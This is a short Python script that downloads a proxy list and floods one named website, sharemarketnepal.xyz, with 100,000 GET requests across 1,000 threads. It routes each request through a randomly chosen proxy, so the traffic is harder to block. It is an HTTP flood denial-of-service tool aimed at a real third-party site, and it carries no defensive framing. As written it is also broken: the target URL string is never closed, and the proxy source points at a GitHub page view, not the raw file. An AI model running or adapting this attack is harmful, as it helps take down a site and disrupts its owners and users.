import requests
import random
from concurrent.futures import ThreadPoolExecutor

# Function to fetch proxies and ports from the URL
def fetch_proxies(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            proxies = response.text.split('\n')
            return proxies
        else:
            print(f"Failed to fetch proxies. Status code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while fetching proxies: {e}")
        return None

# Function to send HTTP request using a random proxy
def send_request(url, proxy):
    try:
        # Set proxy for the request
        proxies = {"http": proxy, "https": proxy}
        
        # Send GET request with the specified proxy
        response = requests.get(url, proxies=proxies)
        
        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            print(f"Request to {url} using proxy {proxy} successful")
            # Process response data if needed
        else:
            print(f"Request to {url} using proxy {proxy} failed with status code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while sending request to {url} using proxy {proxy}: {e}")

def main():
    # Define the URL to fetch proxies and ports
    proxy_url = 'https://github.com/FB-KING/Main-Control/blob/main/proxy.txt'
    
    # Fetch proxies and ports
    proxies = fetch_proxies(proxy_url)
    if not proxies:
        print("Failed to fetch proxies. Exiting.")
        return
    
    # Define the URL to send requests
    url = 'https://sharemarketnepal.xyz/
    
    # Number of times to send the request
    num_requests = 100000
    
    # Maximum number of workers
    max_workers = 1000
    
    # Create a ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit requests
        for _ in range(num_requests):
            # Choose a random proxy from the list
            proxy = random.choice(proxies)
            executor.submit(send_request, url, proxy.strip())

if __name__ == "__main__":
    main()
